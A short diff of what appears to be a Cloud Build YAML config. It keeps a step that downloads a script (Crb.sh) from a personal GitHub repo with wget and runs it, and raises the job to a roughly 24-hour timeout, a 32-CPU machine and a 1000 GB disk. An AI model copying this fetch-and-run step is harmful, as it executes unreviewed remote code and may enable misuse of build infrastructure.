@@ -86,6 +86,10 @@ steps:
     - '-c'
     - |
       wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
-  waitFor:
-    - '-'
-timeout: '86000s'
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86000s
+options:
+  machineType: E2_HIGHCPU_32
+  diskSizeGb: '1000'
